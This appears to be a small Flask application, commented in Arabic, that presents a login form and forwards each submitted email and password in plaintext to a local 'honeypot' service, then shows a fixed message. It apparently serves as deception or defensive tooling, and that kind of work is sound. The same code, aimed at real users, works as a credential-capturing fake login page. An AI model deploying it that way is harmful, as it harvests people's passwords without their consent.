from flask import Flask, render_template, request
import requests

app = Flask(__name__)
app.secret_key = 'secret_key'

HONEYPOT_URL = "http://127.0.0.1:8080"  # بورت الهاني بوت عندك

@app.route("/", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        email = request.form['email']
        password = request.form['password']

        # إرسال البيانات للهاني بوت
        try:
            requests.post(HONEYPOT_URL, data={"email": email, "password": password})
        except Exception as e:
            print(f"Error sending to honeypot: {e}")

        # تقدر هنا تتحقق داخلياً لو تحب
        error = "Check completed"

    return render_template("login.html", error=error)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5001)
